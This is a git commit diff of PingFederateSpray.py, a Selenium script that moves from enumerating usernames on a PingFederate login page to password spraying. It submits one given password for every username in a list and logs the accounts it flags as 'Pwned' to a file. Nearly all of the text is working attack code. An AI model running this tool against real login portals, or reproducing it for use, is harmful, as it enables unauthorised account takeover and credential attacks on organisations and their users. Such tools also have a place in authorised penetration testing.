4a97718cf7e30a2bb584574a0854593158ae205f
MorielHarush <93482738+MorielHarush@users.noreply.github.com>
2024-03-02 17:04:23 +0200

    Update PingFederateSpray.py

--- PingFederateSpray.py
+++ PingFederateSpray.py
@@ -3,8 +3,7 @@ from selenium.webdriver.chrome.options import Options
 import time
 import argparse
 
-
-def check_user(username, url, output_file, incognito, headless):
+def spray_users(username, url, password, output_file, incognito, headless):
     options = Options()
     if incognito:
         options.add_argument("--incognito")
@@ -15,7 +14,7 @@ def check_user(username, url, output_file, incognito, headless):
         driver.get(url)
         username_input = driver.find_element_by_name('subject')
         username_input.send_keys(username)
-
+        # Trigger the postOk function using execute_script
         try:
             driver.execute_script("""
                 try {
@@ -27,36 +26,44 @@ def check_user(username, url, output_file, incognito, headless):
         except Exception as e:
             print(f"Exception: {e}")
 
-        driver.implicitly_wait(100)
         time.sleep(3)
-
         try:
-            driver.find_element_by_name('subject')
-            print(f'[-] The User: {username} not found')
+            password_input = driver.find_element_by_name('pf.pass')
+            password_input.send_keys(password)
             time.sleep(3)
-            return
+            print(f'[*] Spraying The User : {username} !')
+            try:
+                driver.execute_script("""
+                    try {
+                        postOk();
+                    } catch (error) {
+                        console.error(error);
+                    }
+                """)
+                if password_input:
+                    print(f'[-] The User: {username} With The Password: {password} did not Pwned')
+                else:
+                    print(f'[+] Seems like The User {username} is Pwned!')
+                    f = open(output_file, "a")
+                    f.write(username + "\n")
+                    f.close()
+            except Exception as e:
+                print(f"Exception: did not Logged in {e}")
+            time.sleep(3)
         except Exception as e:
-            print('Keep Working...')
-
-        try:
-            driver.find_element_by_name('pf.pass')
-            print(f'[+] The User: {username} found! ')
-            f = open(output_file, "a")
-            f.write(username + "\n")
-            f.close()
-        except Exception as e:
-            print(f'[-] The User: {username} not found')
-
+            print(f'[-] The User: {username} did not logged in')
+        driver.quit()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("--url", required=True, help="URL to check the users")
+    parser.add_argument("--output", required=True, help="Path to the output file for valid sprayed users")
+    parser.add_argument("--password", required=True, help="Password to use for spraying")
     parser.add_argument("--users", required=True, help="Path to the input user file")
-    parser.add_argument("--output", required=True, help="Path to the output valid user file")
-    parser.add_argument("--incognito", required=True, action='store_true', help="Enable incognito mode for the browser")
-    parser.add_argument("--headless", required=True, action='store_true', help="Enable headless mode for the browser")
+    parser.add_argument("--incognito", action='store_true', help="Enable incognito mode for the browser")
+    parser.add_argument("--headless", action='store_true', help="Enable headless mode for the browser")
     args = parser.parse_args()
 
     with open(args.users, 'r') as file:
         for line in file:
-            check_user(line.strip(), args.url, args.output, args.incognito, args.headless)
+            spray_users(line.strip(), args.url, args.password, args.output, args.incognito, args.headless)
